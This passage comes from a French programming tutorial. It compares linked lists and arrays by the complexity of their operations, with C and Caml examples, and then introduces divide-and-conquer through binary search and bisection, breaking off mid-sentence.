la définition d'une liste. Une liste est : soit la liste vide ; soit une cellule à deux champs, un champ tête contenant un élément, et un champ queue contenant l'adresse d'une autre liste. Autrement dit, une liste est \"soit vide, soit un élément suivi d'une liste \". Cette définition est amusante car elle est récursive : elle utilise le mot \"liste\". La définition d'une liste utilise la définition d'une liste ! Mais, de même que les programmes récursifs ne tournent pas tous en boucle à l'infini, cette définition n'est pas un cercle vicieux, et elle est tout à fait correcte (vous le verrez à l'usage). Une liste peut donc être la liste vide (0 élément), ou un élément suivi de la liste vide (1 élément), ou un élément suivi d'un élément suivi de la liste vide (2 éléments), etc. On dira que l'élément dans le champ tête est la tête de la liste, et que la liste dans le champ queue est sa queue. La queue d'une liste contient tous les éléments de la liste, sauf le premier. Par exemple, la queue de la liste [1; 2; 3] est [2; 3] . Bien sûr, la liste vide n'a ni queue ni tête : essayer d'accéder à un de ces champs provoque une erreur. Il existe en réalité de nombreuses variantes de cette structure. J'ai décrit ici la plus simple, que l'on appelle aussi liste simplement chaînée car les cellules contiennent seulement, en plus d'un élément, une flèche vers le suivant (on imagine que ces flèches forment une chaîne). D'autres structures sont utiles dans des cas particuliers (par exemple on peut mettre deux flèches par cellule, une vers l'élément suivant, et une vers l'élément précédent, c'est le principe de la liste doublement chaînée ), mais celle-ci est la plus courante et la plus utile. Implémentation : la représentation des listes chainées dépend beaucoup des langages de programmation. Dans les langages fonctionnels, ce type est déjà défini (par exemple en Caml on note [] la liste vide et tete::queue la cellule dont la tête est tete et la queue queue . En C, il faut le construire soi-même. On utilise une représentation très classique : une structure pour les cellules, et le pointeur NULL pour la liste vide : struct list { int val ; struct list * next ; }; typedef struct list List ; On représente alors les listes comme des pointeurs vers une cellule : List * une_liste ; Comme en C, il faut allouer et libérer la mémoire à la main, on aura aussi besoin d'une fonction qui libère toutes les cellules d'une liste : void free_list ( List * list ) { while ( list != NULL ) { /* tant que la liste n'est pas vide */ List * cell = list ; list = list -> next ; free ( cell ); } } À chaque étape de la boucle while , on stocke la tête de la liste dans une variable cell , on avance dans la liste ( list devient la queue de la liste), et on libère cell . On est obligé d'utiliser cette variable intermédiaire, parce que si on commençait par free(list) , alors list->next n'aurait plus de sens (puisque list a été effacée) et on ne pourrait pas passer à la suite de la liste. Ajout / retrait, taille, accès à un élément Ajout / Retrait Quelle est la manière la plus simple d'ajouter, ou d'enlever un élément à un tableau ou à une liste ? Pour une liste, ces deux opérations sont très simples tant que l'on considère seulement un ajout (ou une suppression) en tête de liste : pour supprimer l'élément de tête, il suffit de remplacer la liste par sa queue (qui est la liste de tous les éléments suivants). Pour ajouter un élément en tête, il suffit de créer une nouvelle cellule, de mettre cet élément dans le champ tête , et la liste de départ dans le champ queue . Ces deux opérations se font en temps constant (la première revient à lire un champ, et la deuxième à créer une cellule), donc leur complexité est en $O(1)$. Remarque : l'opération d'ajout en tête de liste (c'est-à-dire la création d'une nouvelle liste à partir d'un élément et d'une ancienne liste) est fondamentale dans les manipulations de liste. Elle possède un nom spécifique, cons (lire \"consse\"), qui a même donné lieu à un verbe (utilisé seulement en informatique) en anglais, to cons . Elle est fondamentale parce qu'en quelque sorte elle fait partie de la définition des listes, que l'on peut reformuler ainsi : soit une liste vide, soit un cons d'une liste. Implémentation : Dans les langages où les listes existent déjà, il est extrêmement simple de définir cons . Par exemple en Caml : let cons tete queue = tete :: queue Sinon, il faut utiliser le type que l'on a défini soi-même. En C, il faut en plus s'occuper de l'allocation mémoire : List * cons ( int valeur , List * liste ) { List * elem = malloc ( sizeof ( List )); if ( NULL == elem ) exit ( EXIT_FAILURE ); elem -> val = valeur ; elem -> next = liste ; return elem ; } Pour les tableaux, la question est plus délicate. La taille d'un tableau étant fixée à l'avance, il n'est pas possible de rajouter des éléments (tout simplement parce qu'il n'y a pas forcément de place disponible dans la mémoire, sur les bords du tableau, pour pouvoir l'agrandir). La méthode sûre pour ajouter un (ou plusieurs) éléments est de créer un tableau plus grand autre part, qui contienne assez de place pour tous les anciens éléments et le (ou les) nouveau(x), et de recopier les anciens éléments dans le nouveau tableau, avant d'ajouter les nouveaux. Cette méthode demande la création d'un tableau de taille $N+1$, puis une recopie de chaque élément du tableau, elle est donc en $O(N)$ (où $N$ est la taille du tableau avant insertion), ou encore linéaire. De même, la taille d'un tableau étant fixée à l'avance, il n'est pas possible d'en retirer des cases. Remarque : dans certains langages, il est possible d'essayer de redimensionner les tableaux sur place dans certains cas, ou bien d'éliminer des éléments qui sont en début ou en fin de tableau. Cela reste assez hasardeux, et nous ne considérerons pas ces opérations. Taille Quand il s'agit de calculer la taille de la structure de données, c'est le tableau qui a le beau rôle. En effet, on considère que la taille d'un tableau est toujours connue, donc il n'y a pas de calculs à faire pour l'obtenir : c'est une opération en $O(1)$. Pour une liste, on ne connaît pas en général la taille d'une liste (surtout si on vient d'ajouter ou d'enlever beaucoup d'éléments en tête de cette liste). Pour calculer la taille d'une liste, on applique l'algorithme suivant : si c'est la liste vide, sa taille est 0 ; sinon, on calcule la taille de sa queue, et on rajoute 1. Ainsi, on va parcourir la liste jusqu'à tomber sur la liste vide, en rajoutant 1 pour chaque élément. Cette méthode marche très bien, mais demande un parcours complet de la liste, donc est en $O(N)$ (où $N$ est la taille de la liste). Remarque : comme pour les tableaux, il serait possible de stocker la taille des listes dans la structure elle-même, au lieu de devoir la calculer à chaque fois : en plus d'avoir tête et queue , on ajouterait à chaque cellule un champ taille qui contiendrait la taille de la liste. Le problème de cette méthode est que l'opération cons devient plus coûteuse : quand on crée une nouvelle cellule pour l'élément à rajouter, il faut y mettre le nouvel élément et la queue comme auparavant, mais ensuite il faut accéder à la première cellule de la queue, pour y lire la taille $N$ de l'ancienne liste, pour pouvoir mettre $N+1$ dans le champ taille de la nouvelle cellule. Cela ne fait que rajouter une étape (plus précisément, deux lectures de cellules, une addition et une initialisation de champ en plus), donc l'opération reste en $O(1)$, mais cela ralentit quand même sensiblement l'opération, ce qui est gênant quand on utilise beaucoup cons . En pratique, la plupart des gens utilisent beaucoup cons , et ont très peu souvent besoin de la taille de la liste ; cette \"optimisation\" n'est donc pas intéressante, car elle ralentirait le programme. Encore une fois, on retrouve l'idée centrale, qui est qu'il faut choisir ses structures de données selon l'utilisation qu'on veut en faire, pour que les opérations les plus courantes soient les plus rapides possibles. Accès à un élément Comment faire si l'on veut récupérer par exemple le cinquième élément de notre collection (liste ou tableau) ? Pour un tableau, c'est simple : on demande l'élément d'indice 4 (attention au décalage), et on l'obtient immédiatement. Cette opération est en $O(1)$. Pour une liste, c'est plus difficile : quand on a une liste, on a accès directement à la première cellule, donc on ne connaît que sa tête, et sa queue ; on ne peut donner rapidement que le premier élément. Mais en fait, on peut aussi avoir accès au deuxième : c'est la tête de la queue de la liste :magicien: ! Et au troisième : la tête de la queue de la queue de la liste. En fait, on cherche la tête de la queue de la queue de la queue de la queue de la liste. Trop facile. Voici un algorithme pour récupérer l'élément d'indice n dans une liste : si n = 0 (on demande le premier élément), renvoyer l'élément qui est dans le champ tête ; sinon, renvoyer l'élément qui est à l'indice n-1 dans la liste qui est dans le champ queue . Vous pouvez remarquer qu'on considère directement notre liste comme une cellule : si la liste est vide, on ne peut pas y récupérer d'élément, donc c'est une erreur. Pour accéder à un élément, il faut parcourir toute la liste jusqu'à la position voulue. Pour accéder à l'élément d'indice k il faut donc faire environ k opérations. Quelle est la complexité de l'opération ? Comme expliqué dans la première partie, il faut être pessimiste et considérer la complexité dans le pire des cas : dans le pire des cas, on cherche le dernier élément de la liste, il faut donc la parcourir toute entière. L'opération est donc linéaire, en $O(N)$. Vous avez sans doute remarqué la grande différence entre le problème de l'accès au premier élément, et l'accès à \"n'importe quel\" élément. Dans une liste, la première opération est en $O(1)$ ( :soleil: ) et la deuxième en $O(N)$ ( :'( ). Pour bien les différencier, les informaticiens ont un terme spécifique pour dire \"l'accès à n'importe quel élément\" : ils parlent d'accès arbitraire . De nombreuses structures de données peuvent accéder à certains éléments privilégiés très rapidement, mais sont plus lentes pour l'accès arbitraire. Les tableaux ont la propriété d'avoir un accès arbitraire en temps constant, ce qui est rare et très utile dans certains cas. Remarque : vous ne connaissiez peut-être pas le terme \"accès arbitraire\", mais vous avez sûrement déjà rencontré son équivalent anglais, random access . Ou alors, vous ne vous êtes jamais demandé, en tripotant la mémoire vive de votre ordinateur, ce que signifiait RAM : Random Access Memory, mémoire à accès arbitraire. Le problème de l'accès à une liste ne se limite pas seulement à la lecture de l'élément à une position donnée : on pourrait aussi vouloir rajouter ou enlever un élément à cette position. Ces algorithmes sont proches de celui de lecture, et ont eux aussi une complexité linéaire. Petite anecdote pour illustrer l'importance de l'étude de la complexité : lorsque nous ne travaillons pas sur ce tutoriel, il nous arrive de jouer. Parmi ces jeux, l'un d'entre eux avait un temps de chargement de 90 secondes dès qu'il fallait générer une nouvelle carte du monde. Un peu surpris, et étant donné que le code source du jeu était disponible, nous avons étudié la fonctionnalité fautive. Le jeu passait 88 secondes à accéder de manière aléatoire aux éléments d'une liste ! En transformant cette liste en simple tableau, le chargement est devenu quasi-instantané ! Les plus curieux peuvent aller étudier le changement effectué qui a été accepté par l'auteur du jeu vidéo en question. Concaténation, filtrage Concaténation Imaginons que l'on ait deux groupes d'éléments, stockés dans deux listes (ou deux tableaux) différents, et que l'on veuille les réunir. On veut construire une structure qui est en quelque sorte la \"somme\" des deux structures de départ. On appelle cette opération la \"concaténation\" (cela vient du latin pour \"enchaîner ensemble\"). Pour des tableaux, c'est assez facile : si le premier tableau est A, et le deuxième B, et que l'on note $L$ la taille de A et $L'$ (lire \"L prime\") la taille de B, on crée un tableau de taille $L + L'$, où l'on recopie tous les éléments de A, puis tous les éléments de B. Cela demande $L + L'$ copies (et la création de $L + L'$ cases) : l'opération est en $O(L + L')$. Remarque : j'ai ici donné la complexité en fonction de deux variables, $L$ et $L'$. J'avais auparavant défini la complexité comme dépendant d'une seule variable, mais c'est un cas particulier. La complexité d'un algorithme peut dépendre de tous les paramètres dont dépend l'algorithme, et pas seulement d'un seul. De plus, la complexité n'a de sens que quand les variables que l'on utilise pour l'exprimer sont bien définies : dire $O(N&#94;3)$ ne suffit pas, il faut s'assurer que tout le monde comprend ce que désigne la variable $N$ (même si en général, c'est évident et laissé implicite). Pour une liste, la situation est un peu différente : comme on peut facilement ajouter un élément en tête de liste, on peut aussi ajouter une suite d'éléments. Il suffit donc d'ajouter tous les éléments de A en tête de la liste B. Cela revient à faire une copie de A devant B. Vous pouvez déjà deviner (l'algorithme sera précisé ensuite) que comme on ajoute $L$ (la taille de A) éléments en tête de B, la complexité sera en $O(L)$. Voilà un algorithme plus détaillé effectuant la concaténation de A et de B : si elle est vide, on n'a rien à faire : on renvoie la deuxième liste, B ; si c'est une cellule, on procède en deux temps : on calcule la concaténation de sa queue avec B, on rajoute la tête à ce résultat ; On peut résumer cela par cons(tete(A), concat(queue(A), B)) . Encore une fois, cette fonction est récursive, je vous invite à vérifier qu'elle marche bien en l'implémentant vous-mêmes dans votre langage préféré. Quelle est sa complexité ? On va appeler la fonction concat une fois sur A , puis sur queue(A) , puis sur queue(queue(A)) , etc., jusqu'à parvenir à la liste vide. En d'autres termes, on aura appelé concat autant de fois que A a d'éléments. Le reste des opérations (effectuées à chaque appel de concat ) est un cons (et la lecture de la tête), donc en $O(1)$. Faire $L$ (où $L$ est la taille de A) fois une opération en $O(1)$, c'est-à-dire $L$ fois une opération en temps constant, met un temps proportionnel à $L$. C'est en $O(L)$. Remarque : avec cet algorithme, on recopie (par le cons ) chaque cellule de la liste A : la liste B est laissée inchangée, mais on a créé L cellules. Vous avez peut-être remarqué qu'une autre manière de faire serait possible : on pourrait prendre directement la dernière flèche de A (celle qui pointe vers la liste vide), et la modifier pour la faire pointer vers la première cellule de B. Cette méthode a l'avantage de ne pas demander de recopie des cellules de A, mais aussi un inconvénient majeur : elle modifie la liste A. Si vous aviez une variable qui désignait A avant l'opération, elle désigne maintenant concat(A, B) . La liste A, en quelque sorte, a été \"détruite\". Ce comportement, que l'on appelle un effet de bord , peut donner lieu à des bugs si vous ne faites pas attention (par exemple si vous croyez avoir encore accès à A , alors qu'en fait vous êtes en train de manipuler concat(A, B) ). Si l'on élimine la négligence du programmeur (parce que vous êtes sûrement persuadés que vous , vous ne faites pas ce genre d'erreurs - haha !), il peut encore se poser des problèmes délicats dans le cas d'applications multi-thread par exemple (un thread calcule le nombre d'éléments de votre liste, mais juste avant qu'il l'utilise pour faire quelque chose, un autre thread modifie silencieusement la liste en lui ajoutant plein d'éléments à la fin ; la taille calculée par votre premier thread n'est plus valide : boum !). Globalement, l'algorithme présenté, qui a la propriété de ne pas modifier les listes A et B de départ, est beaucoup plus sûr et pratique à utiliser. Il en existe d'autres formulations, mais elles ont de toute manière toutes la même complexité. Vous pouvez noter que la concaténation de deux listes ne dépend pas de la taille de la deuxième liste, qui est conservée à l'identique, mais seulement de la première. Pour les tableaux, la concaténation dépend des deux. C'est une différence qui peut être très importante si vous voulez concaténer très souvent de petites listes (ou de petits tableaux) à une grande liste (ou à un grand tableau). Dans le cas des tableaux, cette opération sera très coûteuse puisque vous devrez recopier le grand tableau à chaque fois. En pratique, il est donc assez rare de concaténer des tableaux, alors que l'opération est plus courante pour les listes. Filtrage Voici une dernière opération qui se présente régulièrement quand vous manipulez des données : sélectionner une partie d'entre elles. Par exemple \"parmi les personnes que je connais, je veux le nom de toutes celles qui parlent allemand\". En informatique, on représentera la question \"est-ce qu'il parle allemand ou non ?\" par une fonction : elle prend une personne en paramètre, et renvoie true (vrai) si elle parle allemand, false (faux) sinon. J'appelle ce genre de fonctions des \"fonctions de choix\" (on les nomme parfois aussi prédicats ). On veut effectuer une opération de filtrage : étant donné une collection (liste ou tableau) contenant des éléments, et une fonction de choix sur ces éléments, vous voulez récupérer seulement les éléments pour lesquels la fonction de choix renvoie true . Si l'on utilise des tableaux (en particulier si l'on veut que les résultats du filtrage soient stockés dans un tableau), on est confronté à un problème : on ne sait pas a priori quel sera le nombre d'éléments à renvoyer. Vous ne savez pas a priori, sans réfléchir ou leur poser la question, combien de vos connaissances parlent allemand. Il y a plusieurs possibilités. J'en citerai une seule pour l'instant (je parlerai d'une deuxième ensuite, et de toute façon si vous pensiez à une autre, c'est très bien). La première possibilité consiste à partir d'un tableau de taille 0 (vide, quoi), en l'agrandissant à chaque fois que vous trouvez un nouveau germaniste dans vos connaissances. Comme on l'a vu, agrandir un tableau demande en général autant de recopies qu'il a de cases. À la première personne trouvée, vous ne ferez aucune recopie (créer un tableau de taille 1 pour mettre la personne). À la deuxième, vous ferez une recopie (la première personne trouvée). À la troisième, vous ferez 2 recopies. Au final, si le tableau filtré possède $K$ éléments, il aura été construit en faisant 0, puis 1, puis 2, ..., puis K-1 recopies, soit $0 + 1 + 2 + ... + (K-1)$ recopies au total, c'est-à-dire environ $\\frac{K&#94;2}{2}$ recopies. Dans le pire des cas, $K$ est égal à $N$, la taille du tableau de départ ( toutes vos connaissances parlent allemand !), et vous avez environ $\\frac{N&#94;2}{2}$ opérations : cet algorithme est en $O(N&#94;2)$. On peut obtenir un algorithme intéressant pour les listes en appliquant exactement cette méthode, mais en utilisant des listes à la place de tableaux : on commence avec une liste vide, et pour chaque élément intéressant (c'est-à-dire qui fait renvoyer true à la fonction de choix), on l'ajoute en tête de la liste (par un cons ). Chaque cons est en $O(1)$, et au final on en fait au maximum $N$. L'algorithme utilisant une liste est donc en $O(N)$. Il est assez frappant de voir qu'en utilisant exactement le même algorithme, on peut obtenir des complexités très différentes simplement en changeant de structure de données. Cela illustre le fait que le choix des structures est important, et que le programmeur doit en être conscient. Pour sauver l'honneur des tableaux, il faut présenter un autre algorithme avec une complexité moins mauvaise que $O(N&#94;2)$. On peut, tout simplement, parcourir notre collection d'éléments à filtrer une première fois pour compter le nombre d'éléments intéressants, créer un tableau de cette taille, puis la parcourir une seconde fois en ajoutant les éléments intéressants dans le tableau. On fait deux parcours, mais le nombre d'opérations reste proportionnel à $N$, donc cet algorithme est bien en $O(N)$. J'ai sans doute dit plusieurs fois qu'on s'intéresserait seulement à la complexité, mais il est temps de faire une exception (car si on n'en faisait jamais, ça serait pas drôle) : cet algorithme demande deux parcours de la collection de départ, donc même s'il a la même complexité que l'algorithme utilisant des listes, il est beaucoup moins intéressant, et en particulier il sera en général plus lent. Il est de plus un peu moins résistant aux diverses situations bizarres qui pourraient se poser : si le tableau de départ est modifié entre les deux parcours, cela peut poser problème ; de plus, la fonction de choix sera appelée deux fois par élément au lieu d'une, ce qui peut être très embêtant si elle fait des choses bizarres (par exemple si elle stocke les éléments intéressants en refusant les éléments déjà rencontrés). Ce sont des problèmes auxquels il est possible de remédier, mais tout cela implique des complications supplémentaires, et peut-être une dégradation des performances. Synthèse Opérations opération tableau liste accès arbitraire $O(1)$ $O(n)$ ajout $O(n)$ $O(1)$ taille $O(1)$ $O(n)$ concaténation $O(n+m)$ $O(n)$ filtrage $O(n)$ $O(n)$ On peut dégager une vue d'ensemble de ces deux structures de données : la liste est une structure à laquelle il est très facile d'ajouter ou d'enlever (par filtrage, par exemple) des éléments, alors que le tableau est très efficace quand le nombre d'éléments ne change pas et qu'on veut l'accès arbitraire. Selon les situations, vous aurez besoin d'utiliser plutôt l'un ou plutôt l'autre. En règle générale, il est bon d'utiliser une liste quand vous n'avez aucune idée du nombre exact d'éléments que vous allez manipuler (par exemple, si vous faites des filtrages, ou que vous prévoyez de rajouter régulièrement des éléments). En contrepartie, vous n'avez pas d'accès arbitraire : vous pouvez toujours enregistrer certains éléments de la liste dans des variables à part si vous en avez besoin très souvent, mais vous ne pouvez pas aller chercher certains éléments spécifiques en milieu de liste directement : la seule méthode d'accès est le parcours de tous les éléments (ou du moins, de tous les éléments du début de la liste : vous pouvez arrêter le parcours en cours de route). Il peut être difficile au début de savoir quelle structure de données choisir dans un cas précis. Même si vous avez fait un choix, restez attentifs aux opérations que vous faites. Si par exemple vous vous retrouvez à demander souvent la taille d'une liste, ou à l'inverse à essayer de concaténer fréquemment des tableaux, il est peut-être temps de changer d'avis. Certains langages offrent des facilités pour manipuler les tableaux, et non pour les listes (qu'il faut construire à la main, par exemple en C) : si vous n'avez pas de bibliothèque pour vous faciliter la tâche, privilégiez la structure qui est facile à utiliser (dans de nombreux cas, il est possible d'imiter ce que l'on ferait naturellement avec une liste en utilisant maladroitement un tableau). Conversions Enfin, il faut savoir que les choix de structures de données, ce n'est pas pour toute la vie. Les structures de données ne sont qu'un moyen de stocker des informations, et, de même qu'il vous arrive peut-être de temps en temps de réorganiser votre bureau ou votre logement, il est possible de changer d'organisation, c'est-à-dire de passer d'une structure de données à une autre, en conservant les informations stockées. Exercice : écrire une fonction convertissant une liste en tableau, et une fonction convertissant un tableau en liste. Les deux fonctions doivent être en $O(N)$. Le passage d'une structure de données à une autre peut être une très bonne idée si votre programme passe par plusieurs phases bien séparées, qui utilisent des opérations très différentes. Par exemple, vous pouvez commencer votre programme en récoltant de l'information (beaucoup d'ajouts d'éléments, de concaténations, de filtrages pour éliminer les mauvais éléments, etc.), avec ensuite une deuxième moitié du programme consacrée à un traitement lourd des informations récoltées (avec des parcours dans tous les sens, beaucoup d'accès arbitraires, le tout sans ajouter ou enlever d'éléments). Dans ce cas, il est tout naturel d'utiliser au départ une liste, et de la convertir au début de la deuxième phase en un tableau. Vous pouvez ainsi combiner les avantages des deux structures pour votre programme. Évidemment, la conversion a un coût, et n'est donc intéressante que si vous comptez gagner pas mal en performance en l'effectuant. Inutile de passer sans arrêt d'une structure à une autre, en faisant très peu d'opérations à chaque fois. Tous les programmes ne sont pas découpés en des phases aussi distinctes et les choix seront parfois assez délicats. Encore une fois, c'est à vous d'essayer de deviner ce qui est le plus adapté, et de tester ensuite. N'hésitez pas à essayer plusieurs configurations différentes pour voir ce qui marche le mieux. Vous verrez dans la suite du cours d'autres structures, aux profils différents, qui pourront être utiles pour les cas intermédiaires. En particulier, il existe des structures hybrides qui permettent d'accéder facilement à un élément particulier (un peu moins rapidement qu'avec un tableau, mais beaucoup plus qu'avec une simple liste), mais aussi d'ajouter ou d'enlever des éléments (un peu moins rapidement qu'en tête de liste, mais beaucoup plus qu'avec un simple tableau). Cependant, ces structures sont en général plus compliquées que les listes et les tableaux. Attention aux langages qui trichent ! Une fois que vous avez lu ce chapitre, vous avez (peut-être) tout compris des différences entre l'accès arbitraire en $O(1)$ et l'accès linéaire en $O(N)$, et vous vous apprêtez à faire un massacre dans votre langage de programmation préféré : \"je vais pouvoir indexer deux milliards de pages supplémentaires par jour !\". Malheureusement, il arrive que certains langages ne fonctionnent pas exactement comme je l'ai décrit ici. Au lieu d'avoir des structures de données hautement spécialisées, comme les listes et les tableaux, ils préfèrent des données qui se comportent \"pas trop mal\" sur la plupart des opérations courantes (ou plutôt que les concepteurs du langage ont jugées les plus courantes), quitte à être des structures de données compliquées et inconnues, et à se comporter parfois beaucoup moins bien que vous ne l'espériez. Le problème c'est que ces structures surprises ont aussi l'habitude agaçante de prendre des noms innocents comme \"listes\" ou \"tableaux\". Par exemple, les \"listes\" de Python sont en fait des tableaux étranges, et les \"tableaux\" de PHP ne sont pas du tout des tableaux (vous auriez dû vous en douter en remarquant qu'ils proposent des opérations \"ajouter au début\", \"ajouter à la fin\", \"retirer au début\", etc.). D'autres langages encore, souvent ceux que l'on appelle des \"langages de scripts\", ont des politiques aussi cavalières quant aux structures de données. Résultat des courses, il faut toujours se méfier avant d'utiliser une structure de données. Essayez de vous renseigner sur la complexité algorithmique des opérations qui vous intéresse, pour vérifier que c'est bien celle à laquelle vous vous attendez. Sur certains algorithmes, passer de $O(1)$ à $O(N)$ pour une opération peut faire très mal ! Il existe une méthode pour repérer les \"structures de données à risques\", c'est-à-dire celles qui ne sont pas tout à fait de vrais tableaux ou de vraies listes, mais des structures de données hybrides déguisées : leur interface. On a vu par exemple qu'un tableau supporte très mal l'insertion d'élément : si la bibliothèque des \"tableaux\" de votre langage propose d'insérer et de supprimer des éléments comme si c'était une opération naturelle, alors ce ne sont sans doute pas de vrais tableaux. On peut donc dire que ces langages trichent . Cependant, ils permettent souvent d'utiliser les \"vraies\" structures de données, dans une bibliothèque spécialisée. Par exemple, les listes de Python proposent un accès arbitraire, mais il vaut souvent mieux utiliser les \"vrais\" tableaux de la bibliothèque array . C'est aussi quelque chose que vous devrez prendre en compte si vous créez un jour votre propre bibliothèque de structures de données (eh oui, ça arrive !). Si une opération est trop coûteuse pour votre structure, vous n'êtes pas obligés de la proposer aux utilisateurs (qui pourraient se croire encouragés à l'utiliser) : une fonction de conversion vers une structure plus classique qui supporte efficacement cette opération fera l'affaire. De manière générale, il est important de bien préciser la complexité prévue des opérations que vous offrez aux utilisateurs. Diviser pour régner Titre complet : Une classe d'algorithme non naïfs : diviser pour régner De nombreux problèmes auxquels on peut être confronté en informatique peuvent être subdivisés en sous-problèmes plus faciles à résoudre. Ce chapitre présente plusieurs cas que l'on peut résoudre efficacement. Gagner au jeu du 'Plus ou Moins' Connaissez-vous le jeu du plus ou moins ? Le Sphinx choisit un nombre entre 1 et 100 et le garde secret. Le but du joueur est de déterminer ce nombre avec le moins de tentatives possibles. À chaque proposition fausse, le joueur reçoit une indication \"c'est plus\" (si le nombre recherché est plus grand) ou \"c'est moins\". La solution naïve consiste à énumérer les nombres les uns après les autres, sans utiliser les indications. On commence par 1, puis on poursuit avec 2, etc. Dans le pire des cas, on risque donc de compter jusqu'à 100 (on dira donc que la complexité de cet algorithme est de $O(N)$, $N$ étant le nombre de possibilités). Peut-on faire mieux ? Imaginons que l'on commence par proposer 50. Quelque soit la réponse du Sphinx, on peut éliminer 50 possibilités : si c'est plus que 50, la solution est entre 50 et 100 ; si c'est moins, la solution est entre 1 et 50. Et ainsi de suite. À chaque étape, on réduit donc le nombre de possibilités par deux. Cet algorithme est donc beaucoup plus efficace que le précédent. En effet, dans le pire des cas, sept propositions sont nécessaires (on verra comment calculer ce nombre magique plus tard). Cet algorithme, qui paraît naturel à utiliser, porte le nom de dichotomie (du grec \"couper en deux\"). Il peut être utilisé dans de nombreux cas : la recherche d'un mot dans un dictionnaire, trouver la solution d'une équation, etc. Dichotomie : Recherche dans un dictionnaire Le dictionnaire peut être représenté sous la forme d'un tableau trié par ordre alphabétique. Pour trouver la définition d'un mot dans le dictionnaire, on utilise l'algorithme de dichotomie : on regarde le mot situé au milieu du dictionnaire. En fonction de sa position par rapport au mot cherché, on sait dans quelle moitié continuer la recherche : s'il est plus loin dans la liste alphabétique, il faut chercher dans la première moitié, sinon dans la deuxième ; on a à nouveau un demi-dictionnaire dans lequel chercher : on peut encore appliquer la même méthode. Essayez de l'implémenter dans votre langage préféré avant de regarder la solution. Le Peuple réclame une solution en Python : def find ( mot , dictionnaire , debut , fin ): milieu = ( debut + fin ) / 2 if dictionnaire [ milieu ] == mot : return True elif debut == fin : return False elif dictionnaire [ milieu ] > mot : return find ( mot , dictionnaire , debut , milieu - 1 ) else : return find ( mot , dictionnaire , milieu + 1 , fin ) # Exemple d'utilisation dictionnaire = [ \"chat\" , \"cheval\" , \"chien\" , \"grenouille\" ] print ( find ( \"chien\" , dictionnaire , 0 , len ( dictionnaire ) - 1 )) Remarque : pour la recherche dichotomique, on a crucialement besoin de l'accès arbitraire : tout repose sur la possibilité de pouvoir regarder directement \"l'élément du milieu\". On ne peut donc pas faire de recherche dichotomique sur des listes, même triées. Il existe cependant des structures de données plus évoluées qui permettent de stocker des éléments et de les retrouver aussi rapidement qu'avec une recherche dichotomique. Calcul de la complexité L'algorithme de dichotomie a une propriété très intéressante : à chaque étape, on effectue la moitié du travail restant (on élimine la moitié des nombres, ou on se restreint à la moitié du dictionnaire, etc.). Autrement dit, si on double la taille de l'entrée (en passant de 100 à 200, ou en ayant un dictionnaire deux fois plus gros), il suffit d'effectuer une étape de plus. Pour tous les algorithmes qu'on a vus jusqu'à présent, on peut se demander : \"comment augmente le temps d'exécution quand on double la taille de l'entrée ?\". Pour un algorithme linéaire (en $O(N)$), on a vu que si l'on double la taille de l'entrée (par exemple la taille de la liste à parcourir), il fallait effectuer deux fois plus d'opérations. Pour un algorithme quadratique (en $O(N&#94;2)$), il faut effectuer quatre fois plus d'opérations : $(2 \\times N)&#94;2 = 4 \\times N&#94;2$. Dans le cas de la dichotomie, il faut effectuer une opération de plus. Cela veut dire que le nombre d'opérations croît très lentement en fonction de l'entrée. En effet, si on continue à doubler l'entrée, on rajoute très peu d'opérations : pour 4 fois l'entrée initiale, deux opérations, pour 8 fois l'entrée initiale, 3 opérations... pour 1024 fois l'entrée initiale, 10 opérations. Si on veut traiter un milliard de fois plus de données, 30 opérations supplémentaires suffisent. Pour confirmer la lenteur de cette croissance, voici un graphe du nombre d'opérations en fonction de la taille de l'entrée, pour une recherche dichotomique : Il se trouve que c'est un comportement relativement courant. On a fait travailler des mathématiciens sur le sujet (toute la nuit, dans une cave, en ne mangeant que des carottes), et ils ont découvert une fonction mathématique qui marche presque pareil, et qui vérifie les deux propriétés qui nous intéressent : $f(1) = 0$ (quand on a une entrée de taille 1, on n'a aucune opération à faire pour avoir le résultat) et $f(2 \\times N) = f(N) + 1$ : quand on double la quantité de données à traiter, l'algorithme fait une opération de plus. Il s'agit de la fonction logarithme . C'est une fonction dont la définition rigoureuse demande un niveau de mathématiques assez avancé, et nous n'essaierons pas de le faire ici. Il suffit de se dire que log(n) correspond au \"nombre de fois qu'on doit diviser n par 2 pour obtenir un nombre inférieur ou égal à 1\". Voici le graphe de la fonction logarithme, en rouge par dessus le graphe précédent : Comme vous pouvez le voir, il \"colle\" très bien à notre graphe précédent. C'est en général un peu en dessous, mais pas de beaucoup (au plus 1), et surtout la vitesse de croissance est globalement la même : les mathématiciens ont bien travaillé (ils ont été récompensés avec de la purée de carottes). En réalité, ils ont même fait du zèle : il n'y a pas une seule \"fonction logarithme\", mais plusieurs. Par exemple il y a une fonction qui ajoute une opération à chaque fois qu'on triple la taille de l'entrée : $f(3 \\times N) = f(N) + 1$. C'est une autre fonction logarithme qu'on appelle \"logarithme en base 3\" (et la nôtre, logarithme en base 2). Mais ce n'est pas important parce qu'ils ont prouvé dans la foulée que les différentes fonctions logarithme ne diffèrent que d'une constante multiplicative (quel que soit $x$, $log_2 (x) = k \\times log_3(x)$ avec k environ 1.58549625) : en termes de complexité, elles sont donc toutes équivalentes, puisqu'en calculant la complexité on néglige les constantes multiplicatives. On dit dont que la recherche dichotomique a une complexité en $O(log N)$, ou une complexité logarithmique . Le but n'est pas de vous effrayer avec ces détails mathématiques : si vous les connaissiez déjà ou si vous les comprenez, c'est très bien, mais sinon ce n'est pas grave. L'important est de savoir reconnaître les algorithmes dont la complexité (temporelle ou spatiale - en mémoire) est logarithmique, parce que ce sont généralement de très bons algorithmes : une complexité logarithmique indique un nombre d'opérations qui croît très lentement, donc un algorithme rapide même sur une énorme quantité de données. On pourrait imaginer des complexités encore plus intéressantes, mais en pratique, à part les algorithmes en temps constant, vous ne verrez quasiment jamais mieux que des algorithmes logarithmiques. Trouver un zéro d'une fonction Supposons que l'on cherche à trouver une approximation de la racine carrée de 2. Cela revient (par définition de la racine carrée) à chercher la solution positive de l'équation $x&#94;2 = 2$, ou encore $x&#94;2 - 2 = 0$. En posant la fonction $f : x \\mapsto x&#94;2 - 2$, on cherche la racine positive de cette fonction, c'est à dire $x$ tel que $f(x) = 0$. On est donc ramené au problème suivant : étant donné une fonction $f$ connue, dont on sait qu'elle a une racine (elle s'annule quelque part), comment obtenir une bonne approximation de la racine ? Pour y parvenir, on choisit un intervalle $[a;b]$ qui contient la solution (par exemple l'intervalle $[0; 2]$). On constate que $f(0)$ est négatif et que $f(2)$ est positif. Comme notre fonction est continue, l'équation $f(x) = 0$ possède nécessairement une solution entre 0 et 2. En utilisant la dichotomie, on peut réduire l'intervalle et donc 